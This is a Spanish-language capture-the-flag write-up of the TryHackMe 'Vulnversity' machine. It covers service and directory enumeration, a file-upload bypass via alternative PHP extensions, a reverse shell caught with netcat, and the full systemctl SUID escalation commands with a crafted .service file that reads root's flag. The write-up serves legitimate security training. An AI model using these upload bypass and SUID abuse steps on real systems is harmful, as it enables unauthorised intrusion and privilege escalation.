[Maquina Vulnversity](https://tryhackme.com/room/vulnversity)
# TryHackMe --- Vulnversity

## 1. Resumen de la Máquina

**Vulnversity** es una máquina de laboratorio de TryHackMe orientada a
practicar una cadena de ataque completa: reconocimiento de servicios,
enumeración de directorios, identificación de una funcionalidad de
subida de archivos, obtención de una **reverse shell**, enumeración
local y escalada de privilegios mediante un binario **SUID**.

La resolución documentada sigue esta cadena:

1.  Reconocimiento de puertos y servicios con `nmap`.
2.  Identificación del servicio web y del puerto `3333`.
3.  Enumeración de directorios con `gobuster`.
4.  Descubrimiento de un formulario de subida de archivos.
5.  Intercepción del tráfico con Burp Suite y configuración del proxy
    mediante FoxyProxy.
6.  Identificación de una extensión permitida para ejecutar el payload.
7.  Preparación de una reverse shell.
8.  Obtención de acceso como `www-data`.
9.  Identificación del usuario local `bill` y obtención de `user.txt`.
10. Preparación de una TTY interactiva.
11. Enumeración de archivos con permisos SUID.
12. Explotación del binario `systemctl` mediante la técnica documentada
    por GTFOBins.
13. Ejecución de un servicio con privilegios y lectura de la flag de
    `root`.

> **Nota sobre las IP:** en las notas aparecen `10.66.141.6` durante el
> reconocimiento y `10.65.181.245` durante la reverse shell. En
> TryHackMe la IP objetivo puede cambiar al reiniciar una máquina. Este
> documento conserva ambas direcciones tal como aparecen en las notas y
> no las trata como si fueran necesariamente la misma instancia.

------------------------------------------------------------------------

## 2. Fase de Reconocimiento

### 2.1 Escaneo inicial con Nmap

El primer paso fue determinar qué servicios estaban expuestos por la
máquina objetivo:

``` bash
nmap -sCV 10.66.141.6 --open
```

El objetivo de este escaneo es obtener una primera fotografía de la
superficie de ataque. Antes de intentar explotar algo, un pentester
necesita saber **qué puertos están accesibles, qué servicios los
utilizan y qué versiones pueden estar ejecutándose**.

#### Desglose del comando

-   `nmap`: herramienta de reconocimiento y enumeración de red.
-   `-sC`: ejecuta los scripts de **Nmap Scripting Engine (NSE)**
    pertenecientes al conjunto predeterminado. Sirve para obtener
    información adicional sobre los servicios detectados.
-   `-sV`: intenta identificar la **versión del servicio** que está
    escuchando en cada puerto.
-   `10.66.141.6`: dirección IP de la máquina objetivo.
-   `--open`: muestra principalmente los puertos que se encuentran
    abiertos.

La combinación `-sC -sV` es especialmente útil al comienzo de una
máquina CTF porque no solamente responde a la pregunta «¿qué puertos
están abiertos?», sino que también ayuda a responder «¿qué hay detrás de
esos puertos?».

Según las notas, este mismo comando permitió obtener tres datos
solicitados por la máquina:

-   La cantidad de puertos abiertos.
-   La versión del servicio **Squid Proxy**.
-   El puerto donde se encontraba ejecutándose el servicio web.
-   El sistema operativo más probable de la máquina.

La información obtenida con `nmap` permitió pasar de un reconocimiento
general a la enumeración específica del servicio web.

------------------------------------------------------------------------

### 2.2 Identificación del servicio web

El reconocimiento indicó que el servidor web estaba disponible en el
puerto:

``` text
3333
```

Esto es importante porque un servidor HTTP no tiene que ejecutarse
necesariamente en el puerto estándar `80` o `443`. Una vez identificado
el puerto, las siguientes herramientas deben apuntar a:

``` text
http://10.66.141.6:3333
```

El puerto `3333` se convierte así en uno de los principales puntos de
interés de la máquina.

------------------------------------------------------------------------

### 2.3 Enumeración de directorios con Gobuster

El siguiente objetivo fue encontrar contenido web que no aparecía
directamente en la página principal.

Se utilizó:

``` bash
gobuster dir -u http://10.66.141.6:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

#### ¿Por qué enumerar directorios?

Un servidor web puede contener rutas que no están enlazadas desde la
página principal. Por ejemplo:

``` text
/
├── index
├── images
├── internal
├── uploads
└── admin
```

Que una ruta no aparezca en la interfaz no significa que no exista.

Por eso se utiliza **directory brute-forcing**: Gobuster prueba
automáticamente una lista de posibles nombres de directorios contra el
servidor y analiza las respuestas HTTP.

#### Desglose del comando

-   `gobuster`: herramienta para enumeración de recursos.
-   `dir`: indica que se realizará enumeración de directorios y archivos
    mediante HTTP.
-   `-u`: especifica la URL objetivo.
-   `http://10.66.141.6:3333`: servidor web y puerto descubierto durante
    el reconocimiento.
-   `-w`: especifica la **wordlist** que se utilizará.
-   `/usr/share/wordlists/dirbuster/directory-list-1.0.txt`: lista de
    nombres utilizada para realizar las peticiones.

El resultado permitió encontrar una ruta interna que contenía un
**formulario de subida de archivos**.

Este descubrimiento fue especialmente relevante porque una funcionalidad
de upload puede convertirse en un vector de ejecución de código si el
servidor acepta archivos ejecutables o si existe una configuración
incorrecta que permite interpretarlos como código.

La evidencia de las notas indica que Gobuster permitió encontrar la ruta
que daba acceso a dicho formulario. fileciteturn0file0L9-L14

------------------------------------------------------------------------

## 3. Explotación y Acceso Inicial

### 3.1 Análisis de la funcionalidad de subida

Una vez localizado el formulario de subida, el siguiente paso fue
determinar **qué tipos de archivos aceptaba realmente el servidor**.

Para analizar las peticiones se utilizó:

-   **Burp Suite**
-   **FoxyProxy**

La idea de utilizar un proxy de interceptación es poder observar y
modificar las peticiones HTTP antes de que lleguen al servidor.

El flujo conceptual es:

``` text
Navegador
    |
    v
FoxyProxy
    |
    v
Burp Suite
    |
    v
Servidor web
```

Esto permite inspeccionar aspectos como:

-   Método HTTP utilizado.
-   Nombre del parámetro de subida.
-   Nombre del archivo.
-   Extensión.
-   `Content-Type`.
-   Respuesta del servidor.
-   Mensajes de error.

Las notas indican que se preparó un payload con distintas extensiones:

``` text
.php
.php3
.php4
.php5
.phtml
```

y se lanzó contra el formulario para identificar qué extensión era
aceptada. fileciteturn0file0L15-L17

### ¿Por qué probar varias extensiones?

Un filtro de subida puede bloquear una extensión concreta, por ejemplo:

``` text
.php
```

sin bloquear necesariamente otras extensiones que el servidor web
también puede interpretar mediante PHP.

Por eso, durante la enumeración de una funcionalidad de upload, no basta
con comprobar una sola extensión. El objetivo es determinar **qué
validación está aplicando el servidor y si existe una extensión
alternativa que termine siendo interpretada por el motor
correspondiente**.

En este caso, las notas indican que las pruebas permitieron determinar
qué archivo podía subirse.

------------------------------------------------------------------------

### 3.2 Preparación de la reverse shell

Después de identificar una extensión aceptada, se utilizó una reverse
shell recomendada por la propia máquina.

La configuración registrada en las notas fue:

``` text
IP del atacante: 192.168.128.13
Puerto de escucha: 443
```

El propósito de una reverse shell es invertir la dirección habitual de
la conexión.

En una conexión tradicional:

``` text
Atacante ───────> Servidor
```

En una reverse shell:

``` text
Servidor comprometido ───────> Atacante
```

Esto es útil porque el proceso que se ejecuta en el servidor inicia la
conexión hacia el equipo del atacante.

Las notas indican que la IP fue modificada por la IP correspondiente a
la conexión VPN de TryHackMe y que se eligió el puerto `443` para la
escucha. fileciteturn0file0L18-L19

------------------------------------------------------------------------

### 3.3 Preparación del listener

Se inició Netcat con:

``` bash
nc -nlvp 443
```

#### Desglose

-   `nc`: Netcat, herramienta capaz de crear conexiones TCP/UDP y
    utilizarse como listener.
-   `-n`: evita resolver nombres DNS.
-   `-l`: coloca Netcat en modo **listen**, esperando una conexión
    entrante.
-   `-v`: activa salida detallada (**verbose**).
-   `-p 443`: especifica el puerto local donde se escuchará.

La salida registrada fue:

``` text
Listening on 0.0.0.0 443
```

Esto significa que Netcat quedó esperando conexiones en el puerto `443`.

------------------------------------------------------------------------

### 3.4 Ejecución del payload y obtención de la shell

Con el listener preparado, el archivo se subió mediante el formulario
web.

Después se accedió al archivo desde una ruta similar a:

``` text
http://10.65.181.245:3333/internal/uploads/reverseshell1.phtml
```

Las notas aclaran que el nombre del archivo fue cambiado.

Al acceder al recurso, el código del archivo fue ejecutado por el
servidor y este inició una conexión hacia el listener del atacante.

La evidencia de la conexión fue:

``` text
Connection received on 10.65.181.245 42788
```

A continuación, el sistema remoto respondió:

``` text
Linux ip-10-65-181-245 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

La información obtenida permite identificar un sistema Linux de
arquitectura `x86_64`, basado en Ubuntu 20.04 según la información del
kernel registrada en las notas.

También apareció:

``` text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Esto confirma que la shell se obtuvo con el usuario:

``` text
www-data
```

`www-data` es una cuenta utilizada habitualmente por servicios web en
sistemas Linux. Por tanto, el acceso inicial no equivale todavía a
acceso administrativo: se trata de una cuenta asociada al servicio web.

La shell además informó:

``` text
/bin/sh: 0: can't access tty; job control turned off
```

Esto indica que se obtuvo una shell sin una terminal interactiva
completa. Esa limitación se abordará posteriormente antes de la fase de
escalada. fileciteturn0file0L21-L39

------------------------------------------------------------------------

### 3.5 Identificación del usuario local

Una vez dentro como `www-data`, la máquina solicitó identificar el
usuario que manejaba el servicio.

Se ejecutó:

``` bash
cd /home
ls
```

#### ¿Por qué `/home`?

En Linux, los directorios personales de los usuarios normales suelen
encontrarse dentro de `/home`.

Por tanto:

``` bash
cd /home
```

cambia el directorio actual a la ubicación donde normalmente se
encuentran los perfiles de usuarios.

Después:

``` bash
ls
```

lista su contenido.

Las notas indican que esta enumeración permitió identificar al usuario:

``` text
bill
```

fileciteturn0file0L41-L45

------------------------------------------------------------------------

### 3.6 Obtención de la flag de usuario

Una vez identificado `bill`, se accedió a su directorio:

``` bash
cd bill
ls
```

El resultado mostró:

``` text
user.txt
```

Después se leyó con:

``` bash
cat user.txt
```

`cat` muestra directamente el contenido del archivo en la terminal.

La presencia de `user.txt` y su lectura corresponden a la obtención de
la **user flag**. fileciteturn0file0L46-L51

------------------------------------------------------------------------

## 4. Escalada de Privilegios

### 4.1 Obtención de una TTY interactiva

Antes de continuar con la enumeración local, se mejoró la shell obtenida
mediante la reverse shell.

Se utilizó:

``` bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

#### ¿Qué hace este comando?

El comando utiliza Python para crear una pseudo-terminal (**PTY**).

Desglose:

``` text
python
```

Ejecuta el intérprete de Python.

``` text
-c
```

Indica que Python debe ejecutar el código proporcionado directamente en
la línea de comandos.

``` python
import pty
```

Carga el módulo `pty`, que proporciona funciones para trabajar con
pseudo-terminales.

``` python
pty.spawn("/bin/bash")
```

Crea una pseudo-terminal y ejecuta `/bin/bash` dentro de ella.

El objetivo no es obtener privilegios adicionales por sí mismo. La
finalidad es conseguir una interacción más parecida a una terminal real,
algo especialmente útil para ejecutar herramientas y comandos que
esperan disponer de una TTY.

------------------------------------------------------------------------

### 4.2 Enumeración de binarios SUID

El siguiente paso fue buscar archivos pertenecientes a `root` que
tuvieran activado el bit **SUID**:

``` bash
find / -user root -perm -4000 -exec ls -ldb {} \;
```

Este comando es una pieza fundamental de la fase de escalada.

#### Desglose

``` text
find /
```

Busca desde `/`, es decir, desde la raíz del sistema de archivos.

``` text
-user root
```

Filtra los archivos cuyo propietario es `root`.

``` text
-perm -4000
```

Busca archivos que tengan activado el bit de permiso `SUID`.

El valor:

``` text
4000
```

representa el bit SUID dentro de los permisos Unix.

Cuando un binario tiene SUID y pertenece a `root`, puede ocurrir que el
programa se ejecute con el **effective UID** del propietario, aunque
quien lo haya ejecutado sea otro usuario.

Por ejemplo:

``` text
Propietario: root
Permisos:    SUID
Ejecutor:    www-data
```

En determinadas condiciones, el proceso puede ejecutarse con privilegios
efectivos de `root`.

Finalmente:

``` text
-exec ls -ldb {} \;
```

hace que `find` ejecute `ls -ldb` sobre cada resultado.

-   `-exec`: ejecuta otro comando para cada archivo encontrado.
-   `ls`: lista información del archivo.
-   `-l`: formato detallado.
-   `-d`: muestra el propio archivo en lugar de intentar listar su
    contenido si se trata de un directorio.
-   `-b`: muestra caracteres especiales de forma escapada.
-   `{}`: representa el archivo encontrado por `find`.
-   `\;`: indica el final del comando asociado a `-exec`.

Las notas indican que uno de los resultados destacó como relevante y que
posteriormente se consultó GTFOBins para determinar cómo aprovechar ese
binario mediante SUID. fileciteturn0file0L52-L60

------------------------------------------------------------------------

### 4.3 Identificación del vector de escalada

La técnica utilizada corresponde a la entrada de **SUID** de `systemctl`
documentada por GTFOBins.

El punto clave es que `systemctl` normalmente es una herramienta
administrativa de `systemd`.

Si una copia de `systemctl` posee el bit SUID y puede ejecutarse con
privilegios efectivos de `root`, un usuario de menor privilegio puede
intentar utilizar sus funciones para crear, habilitar y arrancar un
servicio.

La idea del ataque es:

``` text
www-data
   |
   | ejecuta systemctl con SUID
   v
systemctl con privilegios efectivos elevados
   |
   | crea/habilita/inicia servicio
   v
servicio ejecutado por systemd
   |
   v
comandos ejecutados con privilegios de root
```

El detalle importante es que **no es el archivo de servicio por sí mismo
el que concede privilegios**. El vector consiste en conseguir que un
componente privilegiado de `systemd` procese y ejecute un servicio cuyo
contenido ha sido controlado por el atacante.

------------------------------------------------------------------------

### 4.4 Creación del servicio malicioso

Se utilizó:

``` bash
TF=$(mktemp).service
```

Aquí se crea una variable llamada `TF`.

`mktemp` genera un nombre temporal difícil de predecir. Después:

``` text
.service
```

se añade como extensión.

Por ejemplo, conceptualmente podría producir algo como:

``` text
/tmp/tmp.wPLyx2UzoF.service
```

La ventaja de utilizar `mktemp` es evitar tener que escoger manualmente
un nombre y reducir la posibilidad de colisiones con otro archivo
temporal.

------------------------------------------------------------------------

### 4.5 Construcción del archivo `.service`

Después se creó el contenido del servicio:

``` bash
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
```

El contenido generado fue:

``` ini
[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target
```

#### Explicación del archivo

### `[Service]`

Esta sección contiene la configuración de ejecución del servicio.

### `Type=oneshot`

Indica que el servicio está diseñado para realizar una acción puntual en
lugar de permanecer ejecutándose como un daemon.

### `ExecStart=`

Define el comando que `systemd` debe ejecutar cuando se inicia el
servicio.

En este caso:

``` bash
/bin/sh -c "cat /root/root.txt > /tmp/output"
```

se utiliza `/bin/sh` para ejecutar:

``` bash
cat /root/root.txt > /tmp/output
```

La operación hace dos cosas:

1.  `cat /root/root.txt` intenta leer el archivo que contiene la flag de
    root.
2.  `> /tmp/output` redirige la salida hacia `/tmp/output`.

La razón de utilizar `/tmp/output` es que posteriormente el usuario
`www-data` puede intentar leer ese archivo sin necesitar acceso directo
al archivo `/root/root.txt`.

### `[Install]`

Esta sección contiene información utilizada cuando el servicio se
habilita.

### `WantedBy=multi-user.target`

Indica el target de `systemd` con el que se relaciona el servicio al
habilitarlo.

El archivo fue escrito mediante:

``` text
> $TF
```

El operador `>` redirige la salida de `echo` hacia el archivo indicado
por la variable `$TF`.

Las notas documentan exactamente esta construcción del servicio.
fileciteturn0file0L61-L66

------------------------------------------------------------------------

### 4.6 Enlace del servicio con systemd

Después se ejecutó:

``` bash
/bin/systemctl link $TF
```

`systemctl link` crea un enlace simbólico para que `systemd` pueda
localizar el archivo de unidad indicado.

A continuación:

``` bash
/bin/systemctl enable --now $TF
```

#### Desglose

``` text
systemctl
```

Herramienta para interactuar con el sistema `systemd`.

``` text
enable
```

Configura el servicio para que quede habilitado según el target
correspondiente.

``` text
--now
```

Además de habilitarlo, solicita iniciarlo inmediatamente.

``` text
$TF
```

representa el archivo `.service` creado anteriormente.

Por tanto, el flujo completo es:

``` text
1. Crear archivo .service
2. Hacer que systemd pueda localizarlo
3. Habilitarlo
4. Iniciarlo inmediatamente
5. systemd ejecuta ExecStart
```

Si `systemctl` está siendo ejecutado con los privilegios efectivos
necesarios, el proceso de `systemd` puede ejecutar el comando definido
en `ExecStart` con privilegios administrativos.

Las notas muestran que los comandos utilizados fueron:

``` bash
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

fileciteturn0file0L67-L69

------------------------------------------------------------------------

### 4.7 Recuperación de la flag de root

Después de ejecutar el servicio, se volvió a `/tmp`:

``` bash
cd /tmp/
```

y se listó su contenido:

``` bash
ls
```

Entre los archivos apareció:

``` text
output
```

Después:

``` bash
cat output
```

El contenido correspondía a la flag solicitada por la última pregunta de
la máquina.

El flujo de datos fue:

``` text
/root/root.txt
      |
      | cat
      v
/tmp/output
      |
      | cat como www-data
      v
Flag
```

Esto funciona porque el servicio fue configurado para realizar la
lectura del archivo protegido durante su ejecución privilegiada y
escribir el resultado en un archivo ubicado en `/tmp`, accesible
posteriormente desde la shell obtenida.

Las notas confirman la aparición de `output` en `/tmp` y su lectura
mediante `cat output`. fileciteturn0file0L71-L85

------------------------------------------------------------------------

# Cadena completa del ataque

La resolución completa puede resumirse así:

``` text
                 RECONOCIMIENTO
                       |
                       v
             Nmap -sCV --open
                       |
                       v
             Puerto web 3333
                       |
                       v
               Gobuster dir
                       |
                       v
             Directorio oculto
                       |
                       v
             Upload de archivos
                       |
                       v
        Burp Suite + FoxyProxy
                       |
                       v
        Enumeración de extensiones
                       |
                       v
              Extensión válida
                       |
                       v
              Reverse shell
                       |
                       v
                  www-data
                       |
                       v
             /home -> usuario bill
                       |
                       v
                 user.txt
                       |
                       v
              Obtener user flag
                       |
                       v
               Mejorar TTY
                       |
                       v
             Buscar archivos SUID
                       |
                       v
              systemctl + SUID
                       |
                       v
             Crear .service
                       |
                       v
          systemctl link + enable
                       |
                       v
          Servicio ejecutado por
                 systemd
                       |
                       v
             Lectura de root.txt
                       |
                       v
              /tmp/output
                       |
                       v
                 root flag
```

# Conclusión técnica

La máquina demuestra una cadena de explotación en la que cada fase
aporta información necesaria para la siguiente.

El reconocimiento inicial identifica la superficie expuesta. La
enumeración web encuentra una funcionalidad de subida que se convierte
en el punto de entrada. El análisis de las extensiones permite
determinar qué archivo puede ser procesado por el servidor. La reverse
shell proporciona acceso inicial como `www-data`.

Una vez dentro, la enumeración del sistema permite identificar al
usuario `bill` y localizar la `user.txt`. Para continuar con la escalada
se mejora la shell y se buscan archivos con SUID.

El punto decisivo de la escalada es `systemctl`: al encontrarse en la
lista de binarios SUID, puede utilizarse para interactuar con `systemd`
desde el contexto privilegiado. La creación de un servicio controlado
por el atacante permite definir un `ExecStart` que lea `/root/root.txt`
y escriba su contenido en `/tmp/output`. Finalmente, la shell inicial
puede leer ese archivo y recuperar la flag de root.

La metodología aplicada queda representada como:

``` text
Reconocimiento
      ↓
Enumeración
      ↓
Identificación de superficie de ataque
      ↓
Acceso inicial
      ↓
Enumeración local
      ↓
Identificación de SUID
      ↓
Abuso de binario privilegiado
      ↓
Ejecución privilegiada
      ↓
Root flag
```

> **Nota metodológica:** las notas originales no registran todos los
> comandos intermedios usados durante la navegación de la máquina, la
> configuración exacta de Burp/FoxyProxy ni la salida completa de `nmap`
> y `gobuster`. Por ello, este write-up explica el razonamiento técnico
> de los pasos que sí están documentados y marca como inferencia
> metodológica cualquier transición que no aparece literalmente en las
> notas, en lugar de inventar resultados.
